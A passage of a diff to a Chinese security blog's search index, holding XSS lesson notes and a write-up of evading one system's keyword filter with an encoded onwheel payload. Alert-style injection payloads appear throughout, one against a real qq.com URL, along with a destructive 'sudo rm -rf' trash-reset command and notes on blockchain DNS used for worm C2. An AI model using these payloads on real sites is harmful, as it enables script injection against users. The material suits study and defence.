class="line">&lt;input <span class="attribute">value</span>=<span class="string">"输出"</span>&gt;</span><br><span class="line">&lt;img <span class="attribute">onload</span>=<span class="string">"...[输出]..."</span>&gt;</span><br><span class="line">&lt;body <span class="attribute">style</span>=<span class="string">"...[输出]..."</span>&gt;</span><br></pre></td></tr></table></figure><p><strong>关键点</strong></p><ol><li>对于style属性，可尝试css表达式执行js，IE6、7可以。关键代码：<code>expression: eval(xx)</code>。小技巧：css 里，允许使用转义字符\ + ascii16 进制形式。</li><li>其他html属性，可利用实体编码特性，对关键字进行实体编码，再进行url编码，实现饶过。例如：</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"1"</span> <span class="attr">onerror</span>=<span class="string">"alert()"</span>&gt;</span></span><br><span class="line">和</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"1"</span> <span class="attr">onerror</span>=<span class="string">"&amp;#x61;lert()"</span>&gt;</span></span><br><span class="line">是等效的</span><br></pre></td></tr></table></figure><p>然后代码转换为 url 编码。 <code>&amp; -&gt; %26, # -&gt; %23</code></p><p><strong>防御</strong><br>过滤<code>\&amp;#;</code>。</p><h1 id="第四课：宽字节复仇记"><a href="#第四课：宽字节复仇记" class="headerlink" title="第四课：宽字节复仇记"></a>第四课：宽字节复仇记</h1><p><strong>输出点</strong><br><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//请求参数的值传给了js里的某个变量，但对值里的双引号"做了过滤，导致无法闭合双引号</span></span><br></pre></td></tr></table></figure></p><p><strong>关键点</strong><br>页面编码为GB系的前提下，使用<code>%c0</code>闭合双引号。<br>怎样看页面编码：看meta标签 <code>&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=gb18030&quot; /&gt;</code><br>GBK编码第一字节（高字节）的范围是0x81～0xFE。<br>GB2312是被GBK兼容的，它的高位范围是0xA1～0xF7。</p><p><a href="https://maimeng.me">迈萌</a>我举个例子：</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//请求参数：</span></span><br><span class="line">gb.php?x=<span class="number">1</span><span class="string">";alert(1)//</span></span><br><span class="line"><span class="string">//直接发送，"</span>被转义：</span><br><span class="line">a=<span class="string">"1<span class="subst">\"</span>;alert(1)//"</span>;</span><br><span class="line"><span class="comment">//调整参数：</span></span><br><span class="line">gb.php?x=<span class="number">1</span>%<span class="number">81</span><span class="string">";alert(1)//</span></span><br><span class="line"><span class="string">//最终结果，成功闭合双引号：</span></span><br><span class="line"><span class="string">a="</span><span class="number">1</span>[%<span class="number">81</span>和\拼接成的新字符]<span class="string">";alert(1)//"</span>;</span><br></pre></td></tr></table></figure><p><strong>防御</strong><br>1、赋值前用js检查数据内容，只允许使用字母数字下划线等，其他字符一律过滤；2、用utf-8编码</p><h1 id="第五课：反斜线复仇记"><a href="#第五课：反斜线复仇记" class="headerlink" title="第五课：反斜线复仇记"></a>第五课：反斜线复仇记</h1><p><strong>输出点</strong></p><p>输出点还是在js代码里，不同的是，这一课需要同时利用多个技巧。</p><p><strong>关键点</strong></p><ol><li><p>反斜线\可以吃掉原代码里的双引号”，</p></li><li><p>//可以注释掉右边的代码</p></li><li><p>==的运算优先级比&amp;高</p></li><li><p>如何避免变量未定义，可控的后边主动声明一个，例如：</p><p>from==1，from没定义会报错，代码后面加上function from(){}即可。函数声明会被优先解析。</p></li><li><p>空格被过滤的话，可以用/**/代替。例如：</p><p>function/**/aa(){}</p></li></ol><p><strong>防御</strong><br>过滤</p><h1 id="第六课：换行符复仇记"><a href="#第六课：换行符复仇记" class="headerlink" title="第六课：换行符复仇记"></a>第六课：换行符复仇记</h1><p><strong>输出点</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">代码段</span><br><span class="line"><span class="comment">//xx[输出点]xx</span></span><br><span class="line">代码段</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p><strong>关键点</strong></p><p>构造输出点：<code>%0Aalert();//</code>即可，利用换行符开启新的一行。例如：</p><p>原请求：a=1，我们构造：a=%0Aalert();//，最终输出如下：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">代码段</span></span><br><span class="line"><span class="actionscript"><span class="comment">//xx</span></span></span><br><span class="line"><span class="actionscript">alert();<span class="comment">//xx</span></span></span><br><span class="line"><span class="undefined">代码段</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>alert()触发执行。</p><p><strong>防御</strong><br>尽量不要在js注释里输出内容，太危险。</p><h1 id="第七课：宽字节、反斜线与换行符一起复仇记"><a href="#第七课：宽字节、反斜线与换行符一起复仇记" class="headerlink" title="第七课：宽字节、反斜线与换行符一起复仇记"></a>第七课：宽字节、反斜线与换行符一起复仇记</h1><p><strong>输出点</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//双引号已过滤</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=<span class="string">"[输出点]"</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript"><span class="comment">//a="[输出点]";</span></span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> b=<span class="string">"[输出点]"</span>;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>关键点</strong></p><p>1、换行符可以分割注释。<br>2、js里字符串的值运行多行书写，用\分割。<br>3、\被过滤，要试试能不能用宽字节饶过。</p><p><strong>防御</strong><br>参考前面的修复办法。</p><h1 id="第八课：Dom-XSS入门-显式输出"><a href="#第八课：Dom-XSS入门-显式输出" class="headerlink" title="第八课：Dom XSS入门 [显式输出]"></a>第八课：Dom XSS入门 [显式输出]</h1><p><strong>输出点</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//双引号已过滤</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"div1"</span>&gt;</span>aaa<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> a=<span class="string">"[输出点]"</span>;</span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.getElementById(<span class="string">"div1"</span>).innerHTML=a;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>关键点</strong></p><p>1、js字符串用unicode字符表示：例如&lt;用\u003c，&gt;用\u003e表示，空格用\u0020表示。<br>2、js字符串用十六进制字符表示：例如&lt;用\x3c，&gt;用\x3e表示。<br><strong>防御</strong><br>参考前面的修复办法。</p><h1 id="第九课：Dom-XSS入门-隐式输出"><a href="#第九课：Dom-XSS入门-隐式输出" class="headerlink" title="第九课：Dom XSS入门 [隐式输出]"></a>第九课：Dom XSS入门 [隐式输出]</h1><p><strong>输出点</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//请求：?name=xx</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"div1"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> a=getParam(<span class="string">"name"</span>);</span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.getElementById(<span class="string">"div1"</span>).innerHTML=a;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>关键点</strong></p><p>1、请求参数做了赋值，在js里搜索请求参数即可。</p><p>2、decodeURICompent()</p><p><strong>防御</strong><br>过滤。</p><h1 id="第十课：Dom-XSS进阶-邂逅eval"><a href="#第十课：Dom-XSS进阶-邂逅eval" class="headerlink" title="第十课：Dom XSS进阶 [邂逅eval]"></a>第十课：Dom XSS进阶 [邂逅eval]</h1><p><strong>输出点</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//请求：?name=xx</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="built_in">eval</span>(getParam(<span class="string">'name'</span>));</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>关键点</strong></p><p>1、可控参数传入了eval函数；</p><p>2、小技巧：在可控参数加入\等特殊字符，看js是否报错，快速定位到相关代码；</p><p>请求：<a href="http://kf.qq.com/search_app.shtml?key;alert(1);//=aaaa" target="_blank" rel="noopener">http://kf.qq.com/search_app.shtml?key;alert(1);//=aaaa</a><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">'this.key="aaaa";'</span>);</span><br><span class="line"><span class="built_in">eval</span>(<span class="string">'this.key;alert(1);//="aaaa";'</span>);</span><br></pre></td></tr></table></figure></p><p>成功触发alert执行。</p><p><strong>防御</strong><br>过滤。</p><h1 id="第十一课：DOM-XSS进阶-善变iframe"><a href="#第十一课：DOM-XSS进阶-善变iframe" class="headerlink" title="第十一课：DOM XSS进阶[善变iframe]"></a>第十一课：DOM XSS进阶[善变iframe]</h1><p><strong>输出点</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"xxx"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>关键点</strong><br>iframe的src属性：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//javascript:</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"javascript:alert(1)"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">//vbscript:</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"vbscript:msgbox(1)"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">//data协议：</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span> Chrome</span><br></pre></td></tr></table></figure></p><p>iframe的srcdoc属性（IE不支持）：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">srcdoc</span>=<span class="string">"&lt;script&gt;alert(1)&lt;/script&gt;"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>举例：</p><p>获取url里的参数，赋值到iframe的src属性，赋值前只过滤了javascript关键字，这种情况可以用data、vbscript饶过，最终触发xss。<br><strong>防御</strong><br>src属性里，除了过滤jasvascipt关键字，还要过滤vbscript、data等关键字。</p>]]></content>
+      
+      
       <categories>
-        <category>web安全</category>
-        <category>xss</category>
+          
+          <category> web安全 </category>
+          
+          <category> xss </category>
+          
       </categories>
-      <tags>
-        <tag>xss</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[一次小小的实战：利用html实体转义特性XSS]]></title>
-    <url>%2F2019%2F04%2Fxss-html-entity%2F</url>
-    <content type="text"><![CDATA[背景今天在看《那些年我们一起学XSS》，文中提到html属性中遇到实体字符，会自动对其转义。怎样利用这个特性进行xss呢？显然，最典型的情况是在onxxx事件中如果过滤了一些敏感字符，我们对这些敏感字符进行实体编码，再发送，顺利的话就可以xss了。 实战于是想找个开源系统实战加深下印象，这一找还真被我逮到一个：）。某系统，搜索功能如下，我们看看这里能不能X： 右键查看源码： 我们先试试在后面加上&quot;&gt;&lt;script&gt;&lt;/script&gt;，会不会过滤: 经过一一确认，发现系统遇到&lt;script&gt;标签就会被干掉。。。 再试试第二种方法，19276&quot; onclick=&quot;alert()&quot;&gt;，看看结果：悲催，又被过滤了，经过确认，onclick、alert关键词都会过滤，常见的onxx事件都被过滤了。随便写个不存在的事件19276&quot; oncleeeick=&quot;aleeert()&quot;&gt;，虽然被chrome拦截了，但至少系统不拦截了，看来还是有希望的，如下： 下一步希望能找到一个冷门dom事件，不在黑名单里的，经过一番尝试，还真找到一个不会过滤的，onwheel事件，官方说明： onwheel：该事件在鼠标滚轮在元素上下滚动时触发。 onwheel没过滤，如下： 喜出望外啊，赶紧弹个窗先： 关键点我去。。。又被过滤了，怎么破？想起刚刚看过的html实体编码转义特性，把alert实体编码试试。a的十六进制是61，实体编码就是&amp;#x61;。然后拼接就可以了吗？肯定是不行的，因为url中遇到&amp;就截断参数了，&amp;#x61;中恰好有&amp;，为了避免干扰，迈萌我要继续对&amp;#x61;进行url编码，推荐web2hack.org/xssee/ 编码，真的好用，&amp;#x61;url编码后为%26%23x61%3B。最终构造的payload如下： 1k=19276"+onwheel="%26%23x61%3Blert(/xss/)"&gt; 我们在火狐中实验，鼠标移到搜索框滚动页面，成功触发xss：]]></content>
+      
+      
+        <tags>
+            
+            <tag> xss </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>一次小小的实战：利用html实体转义特性XSS</title>
+      <link href="/2019/04/xss-html-entity/"/>
+      <url>/2019/04/xss-html-entity/</url>
+      
+        <content type="html"><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>今天在看《那些年我们一起学XSS》，文中提到html属性中遇到实体字符，会自动对其转义。怎样利用这个特性进行xss呢？显然，最典型的情况是在onxxx事件中如果过滤了一些敏感字符，我们对这些敏感字符进行实体编码，再发送，顺利的话就可以xss了。</p><h1 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h1><p>于是想找个开源系统实战加深下印象，这一找还真被我逮到一个：）。某系统，搜索功能如下，我们看看这里能不能X：</p><p><img src="/2019/04/xss-html-entity/search.jpg" alt="p"></p><p>右键查看源码：<br><img src="/2019/04/xss-html-entity/yuanma1.jpg" alt="p"></p><p>我们先试试在后面加上<code>&quot;&gt;&lt;script&gt;&lt;/script&gt;</code>，会不会过滤:<br><img src="/2019/04/xss-html-entity/waf1.jpg" alt="p"></p><p>经过一一确认，发现系统遇到<code>&lt;script&gt;</code>标签就会被干掉。。。</p><p>再试试第二种方法，<code>19276&quot; onclick=&quot;alert()&quot;&gt;</code>，看看结果：<br><img src="/2019/04/xss-html-entity/waf2.jpg" alt="p"><br>悲催，又被过滤了，经过确认，onclick、alert关键词都会过滤，常见的onxx事件都被过滤了。随便写个不存在的事件<code>19276&quot; oncleeeick=&quot;aleeert()&quot;&gt;</code>，虽然被chrome拦截了，但至少系统不拦截了，看来还是有希望的，如下：<br><img src="/2019/04/xss-html-entity/waf3.jpg" alt="p"></p><p>下一步希望能找到一个冷门dom事件，不在黑名单里的，经过一番尝试，还真找到一个不会过滤的，onwheel事件，官方说明：</p><blockquote><p>onwheel：该事件在鼠标滚轮在元素上下滚动时触发。</p></blockquote><p>onwheel没过滤，如下：<br><img src="/2019/04/xss-html-entity/onwheel.jpg" alt="p"></p><p>喜出望外啊，赶紧弹个窗先：</p><p><img src="/2019/04/xss-html-entity/waf4.jpg" alt="p"></p><h2 id="关键点"><a href="#关键点" class="headerlink" title="关键点"></a>关键点</h2><p>我去。。。又被过滤了，怎么破？想起刚刚看过的html实体编码转义特性，把alert实体编码试试。<br>a的十六进制是61，实体编码就是<code>&amp;#x61;</code>。然后拼接就可以了吗？肯定是不行的，因为url中遇到&amp;就截断参数了，<code>&amp;#x61;</code>中恰好有&amp;，为了避免干扰，<a href="https://maimeng.me">迈萌</a>我要继续对<code>&amp;#x61;</code>进行url编码，推荐web2hack.org/xssee/ 编码，真的好用，<code>&amp;#x61;</code>url编码后为<code>%26%23x61%3B</code>。最终构造的payload如下：</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">k=<span class="number">19276</span><span class="string">"+onwheel="</span><span class="meta">%</span><span class="number">26</span><span class="meta">%</span><span class="number">23</span>x<span class="number">61</span><span class="meta">%</span><span class="number">3</span>Blert<span class="comment">(/xss/)</span><span class="string">"&gt;</span></span><br></pre></td></tr></table></figure><p>我们在火狐中实验，鼠标移到搜索框滚动页面，成功触发xss：<br><img src="/2019/04/xss-html-entity/ok.jpg" alt="p"></p>]]></content>
+      
+      
       <categories>
-        <category>web安全</category>
-        <category>xss</category>
+          
+          <category> web安全 </category>
+          
+          <category> xss </category>
+          
       </categories>
-      <tags>
-        <tag>xss</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[mac下删除文件无法移入废纸篓的解决办法]]></title>
-    <url>%2F2019%2F04%2Fmac-trash%2F</url>
-    <content type="text"><![CDATA[有时mac下删除文件突然无法移入到废纸篓，删除文件时只弹出一个提示”您确定要删除xx文件吗？”，确定就直接删除，不进入废纸篓，如何恢复删除到废纸篓呢，解决办法很简单： Mac 10.14以前版本： cd ～ rm .Trash 注销账户，重新登陆 Mac10.14： rm -R ~/.Trash killall Finder]]></content>
+      
+      
+        <tags>
+            
+            <tag> xss </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>mac下删除文件无法移入废纸篓的解决办法</title>
+      <link href="/2019/04/mac-trash/"/>
+      <url>/2019/04/mac-trash/</url>
+      
+        <content type="html"><![CDATA[<p>有时mac下删除文件突然无法移入到废纸篓，删除文件时只弹出一个提示”您确定要删除xx文件吗？”，确定就直接删除，不进入废纸篓，如何恢复删除到废纸篓呢，解决办法很简单：</p><p>Mac 10.14以前版本：</p><ol><li>cd ～</li><li>rm .Trash</li><li>注销账户，重新登陆</li></ol><p>Mac10.14：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo rm -rf ~/.Trash</span><br></pre></td></tr></table></figure></p>]]></content>
+      
+      
       <categories>
-        <category>杂项</category>
+          
+          <category> 杂项 </category>
+          
       </categories>
-      <tags>
-        <tag>Mac</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[区块链域名解析服务emerdns学习笔记]]></title>
-    <url>%2F2019%2F04%2Femerdns%2F</url>
-    <content type="text"><![CDATA[前段时间看360netlab的一篇文章基于区块链DNS的Fbot蠕虫，文中提到的Fbot蠕虫，其C2用到了区块链域名解析服务emerDNS，觉得挺有意思，一直念念不忘，最近抽出空来，初步学习下。 emerCoin简介emerCoin是一个区块链项目，提供多个分布式服务，比如分布式域名解析emerDNS、分布式密钥管理emerSSH、分布式证书管理emerSSL等。要使用emerDNS，首先要有钱包，还要充一点币，下面具体介绍。 安装emerCoin钱包首先到官网下载emerCoin钱包，下载地址点这里。下载钱包后，按照提示安装，第一次打开需要同步区块数据，数据量不大，大概几十分钟就可同步完毕，我这里安装的是mac版，最终打开后的界面是这样： 然后你需要为自己充一些emerCoin币，可以从以下交易所充值：我选的是hitbtc交易所，购买emerCoin币后，将其提现到自己的钱包，具体流程和转账比特币类似，具体不细说了。现在我们的钱包有了一些emerCoin币，点击钱包的Manage Names栏目，我们能看到DNS设置按钮，如下： 在具体设置之前，我们先看下emerDNS介绍。 emerDNS简介什么是emerDNS？简单说就是把域名解析过程放在区块链上进行。有啥好处呢？按照官方的说法是这样： 你是否担心自己的网站某一天被关停？随着全球管控力度的加强，这种担心不无道理。EmerDNS可免除这一烦恼。EmerDNS完全去中心化，不受任何管控影响。没有人可以修改你的记录，只有记录创建者才能操作记录内容。在多个浏览器扩展的帮助下，通过OpenNIC服务器或代理可轻松解析EmerDNS网站。 EmerDNS是一个去中心化的域名系统，支持各种DNS记录。EmerDNS在Emercoin NVS中的服务缩写”dns”下运行。 上面提到的NVS是什么？全称是Name Value System，就是一个键值对数据库，写过代码的肯定都知道。到这你可能猜出来了，name里存储域名，value里存储解析记录。我们看下一个典型的emerDNS记录格式。先打开emercoin NVS区块浏览器，地址如下：https://explorer.emercoin.com/nvs type框里输入dns，点击搜索，典型的dns记录格式如下： 我们再回来看看钱包里怎么设置dns，点击dns按钮，弹出子窗口，填写dns name和对应记录即可，这里我添加的A记录94.23.252.190是namecoin官网的地址，如下： 点击OK，回到主界面，我们能看到键值操作有NAME_NEW、NAME_UPDATE、NAME_DELETE三种，这里我们是新增一条A记录，选默认的NAME_NEW即可，点击submit，就会把记录提交到区块链网络中，需要一段时间同步，耐心等会，如下： 我们在回到nvs浏览器看下，果然，有记录了，如下：下面我们看看解析emerdns有哪些方式。 解析emerDNS的五种方式使用OpenNIC DNS使用openNIC DNS服务，这应该是最方便的方式了，把本机DNS设成openNIC的dns地址，即可访问各种非标准域名。迈萌我整理了下，openNIC支持解析的非标准域名有.bit、.coin、.lib、.emc等。 openNIC 所有dns 地址见servers.opennic.org，从中抽取一个，设置本机dns为176.126.70.119，然后用浏览器访问我们前面设置的emerDNS域名magicming.lib，果然跳转到namecoin的官网，为优秀的自己点个赞，如下： 使用dig命令也可以用下面命令dig一下，通过应答的A记录能看出确实是前面设置的ip， 1dig @176.126.70.119 magicking.lib 应答如下： 使用浏览器插件访问peername，下载对应浏览器插件，我下载的是chrome版，安装后浏览器右上角多了一个地球图标，注意该插件和代理类插件冲突，顺利话就可以访问http://magicming.lib 了，如下： 使用钱包内置的控制台进入emerCoin钱包，打开 菜单—&gt; 帮助—&gt; 调试窗口—&gt; 控制台，输入help可查看所有命令，dns相关命令如下：1234name_show [name] [valuetype] [filepath]name_new &lt;name&gt; &lt;value&gt; &lt;days&gt; [toaddress] [valuetype]name_update &lt;name&gt; &lt;value&gt; &lt;days&gt; [toaddress] [valuetype]name_delete &lt;name&gt; 这里我们使用name_show命令查看magicming.lib的dns解析记录，命令如下：1name_show dns:magicming.lib 返回记录如下，我们成功读取了A记录： 使用emercoin命令行emerCoin官网提供了emercoin 命令行，支持ubuntu、debian、centos，下载地址点这里。迈萌我这里以ubuntu16为例，安装步骤如下： 123$ apt-key adv --keyserver keyserver.ubuntu.com --recv B58C58F4$ add-apt-repository 'deb http://download.emercoin.com/ubuntu xenial emercoin'$ apt update &amp;&amp; apt -y install emercoin 安装完毕后首先启动对应服务，命令如下：1service emercoind start 然后服务在后台开始自动同步区块，同步期间试了下不能读取NVS。同步完成后，执行以下命令即可解析域名： 1emc name_show dns:magicming.lib 病毒爱上emerDNS的理由对比传统域名解析，我们能感受到emerDNS有以下优势： 传统情报库不一定会收录这类非标准域名 emerDNS去中心化，无法通过ICANN成员单位来sinkhole该域名 emerDNS更健壮，更具有所有权 增大安全人员分析难度 可以预测也正在发生，基于区块链的各种技术，会越来越多的用在传统黑产中。 怎样防御emerDNS仅从监测感知层面来说，可以在情报库中加入以下数据，增强感知力： 各种非标准域名后缀 可疑非标准域名对应的ip openNIC DNS列表（用这个NDS的不是极客就是黑产） …… 直接干掉emerDNS，目前没什么好想法。]]></content>
+      
+      
+        <tags>
+            
+            <tag> Mac </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>区块链域名解析服务emerdns学习笔记</title>
+      <link href="/2019/04/emerdns/"/>
+      <url>/2019/04/emerdns/</url>
+      
+        <content type="html"><![CDATA[<p>前段时间看360netlab的一篇文章<a href="https://blog.netlab.360.com/fbot-a-satori-related-block-chain-dns-based-worm/" target="_blank" rel="noopener">基于区块链DNS的Fbot蠕虫</a>，文中提到的Fbot蠕虫，其C2用到了区块链域名解析服务emerDNS，觉得挺有意思，一直念念不忘，最近抽出空来，初步学习下。</p><h1 id="emerCoin简介"><a href="#emerCoin简介" class="headerlink" title="emerCoin简介"></a>emerCoin简介</h1><p>emerCoin是一个区块链项目，提供多个分布式服务，比如分布式域名解析<strong>emerDNS</strong>、分布式密钥管理emerSSH、分布式证书管理emerSSL等。要使用emerDNS，首先要有钱包，还要充一点币，下面具体介绍。</p><h1 id="安装emerCoin钱包"><a href="#安装emerCoin钱包" class="headerlink" title="安装emerCoin钱包"></a>安装emerCoin钱包</h1><p>首先到官网下载emerCoin钱包，下载地址<a href="http://www.emercoin.com/zh/for-coinholders#download" target="_blank" rel="noopener">点这里</a>。下载钱包后，按照提示安装，第一次打开需要同步区块数据，数据量不大，大概几十分钟就可同步完毕，我这里安装的是mac版，最终打开后的界面是这样：</p><p><img src="/2019/04/emerdns/wallet1.jpg" alt="pic"></p><p>然后你需要为自己充一些emerCoin币，可以从以下交易所充值：<br><img src="/2019/04/emerdns/exchange1.jpg" alt="pic"><br>我选的是hitbtc交易所，购买emerCoin币后，将其提现到自己的钱包，具体流程和转账比特币类似，具体不细说了。现在我们的钱包有了一些emerCoin币，点击钱包的Manage Names栏目，我们能看到DNS设置按钮，如下：</p><p><img src="/2019/04/emerdns/wallet-dns.jpg" alt="pic"><br>在具体设置之前，我们先看下emerDNS介绍。</p><h1 id="emerDNS简介"><a href="#emerDNS简介" class="headerlink" title="emerDNS简介"></a>emerDNS简介</h1><p>什么是emerDNS？简单说就是把域名解析过程放在区块链上进行。有啥好处呢？按照官方的说法是这样：</p><blockquote><p>你是否担心自己的网站某一天被关停？随着全球管控力度的加强，这种担心不无道理。EmerDNS可免除这一烦恼。EmerDNS完全去中心化，不受任何管控影响。没有人可以修改你的记录，只有记录创建者才能操作记录内容。在多个浏览器扩展的帮助下，通过OpenNIC服务器或代理可轻松解析EmerDNS网站。</p></blockquote><blockquote><p>EmerDNS是一个去中心化的域名系统，支持各种DNS记录。EmerDNS在Emercoin <strong>NVS</strong>中的服务缩写”dns”下运行。</p></blockquote><p>上面提到的NVS是什么？全称是Name Value System，就是一个键值对数据库，写过代码的肯定都知道。到这你可能猜出来了，name里存储域名，value里存储解析记录。我们看下一个典型的emerDNS记录格式。先打开emercoin NVS区块浏览器，地址如下：<a href="https://explorer.emercoin.com/nvs" target="_blank" rel="noopener">https://explorer.emercoin.com/nvs</a></p><p>type框里输入dns，点击搜索，典型的dns记录格式如下：</p><p><img src="/2019/04/emerdns/search.jpg" alt="pic"></p><p>我们再回来看看钱包里怎么设置dns，点击dns按钮，弹出子窗口，填写dns name和对应记录即可，这里我添加的A记录94.23.252.190是namecoin官网的地址，如下：</p><p><img src="/2019/04/emerdns/dns2.jpg" alt="p"></p><p>点击OK，回到主界面，我们能看到键值操作有NAME_NEW、NAME_UPDATE、NAME_DELETE三种，这里我们是新增一条A记录，选默认的NAME_NEW即可，点击submit，就会把记录提交到区块链网络中，需要一段时间同步，耐心等会，如下：</p><p><img src="/2019/04/emerdns/submit.jpg" alt="p"></p><p>我们在回到nvs浏览器看下，果然，有记录了，如下：<br><img src="/2019/04/emerdns/value.jpg" alt="p"><br>下面我们看看解析emerdns有哪些方式。</p><h1 id="解析emerDNS的五种方式"><a href="#解析emerDNS的五种方式" class="headerlink" title="解析emerDNS的五种方式"></a>解析emerDNS的五种方式</h1><h2 id="使用OpenNIC-DNS"><a href="#使用OpenNIC-DNS" class="headerlink" title="使用OpenNIC DNS"></a>使用OpenNIC DNS</h2><p>使用openNIC DNS服务，这应该是最方便的方式了，把本机DNS设成openNIC的dns地址，即可访问各种非标准域名。<a href="https://maimeng.me">迈萌</a>我整理了下，openNIC支持解析的非标准域名有.bit、.coin、.lib、.emc等。</p><p>openNIC 所有dns 地址见<a href="https://servers.opennic.org" target="_blank" 